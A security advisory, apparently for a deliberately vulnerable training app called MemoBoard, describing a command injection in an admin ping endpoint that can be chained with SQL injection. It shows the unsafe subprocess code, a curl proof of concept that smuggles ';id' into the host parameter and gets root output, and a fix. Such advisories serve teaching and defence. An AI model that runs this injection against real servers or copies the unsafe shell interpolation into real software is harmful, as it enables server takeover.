# Advisory: MemoBoard admin ping endpoint command injection (RCE)

## Summary

MemoBoard v0.5.0 is affected by a command injection vulnerability in the admin-only `/api/tools/ping` endpoint. The `host` query parameter is interpolated directly into a shell command string passed to `subprocess.getoutput`, allowing an authenticated administrator to execute arbitrary OS commands on the server.

## Description

The `ping_host` function in `board/engine.py` constructs a shell command using an f-string:

```python
def ping_host(host: str) -> str:
    return subprocess.getoutput(f"echo MEMO-PING {host}")
```

The `host` value originates from the `GET /api/tools/ping?host=` query parameter (`app.py` line 104) and is concatenated into the command string without any sanitization or escaping. Because `subprocess.getoutput` invokes the system shell (`shell=True`), shell metacharacters such as `;`, `|`, and backticks are interpreted, enabling arbitrary command execution.

The endpoint requires an admin session (`session["role"] == "admin"`). Admin credentials can be obtained through a separate SQL injection vulnerability in `GET /api/users` (unauthenticated), forming an attack chain from anonymous access to remote code execution.

## Affected versions

- MemoBoard v0.5.0 (all versions shipped with the current codebase)

## Impact

An attacker with admin session access can execute arbitrary operating system commands on the server, achieving full remote code execution. When chained with the unauthenticated SQL injection in `/api/users`, an unauthenticated attacker can dump admin credentials, log in, and achieve RCE.

## Proof of concept

```bash
# 1. Login as admin (credentials obtainable via SQLi on /api/users)
curl -c cookies.txt -X POST http://TARGET:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# 2. Command injection
curl -b cookies.txt "http://TARGET:5000/api/tools/ping?host=;id"

# Response:
# MEMO-PING
# uid=0(root) gid=0(root) groups=0(root)
```

## Remediation

Use `subprocess.run` with a parameter list (`shell=False`) and validate the `host` parameter against a strict IP/hostname whitelist:

```python
import subprocess

def ping_host(host: str) -> str:
    result = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True, timeout=5)
    return result.stdout
```

## References

- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- [INTENDED_VULNS.md](INTENDED_VULNS.md) — MB-02
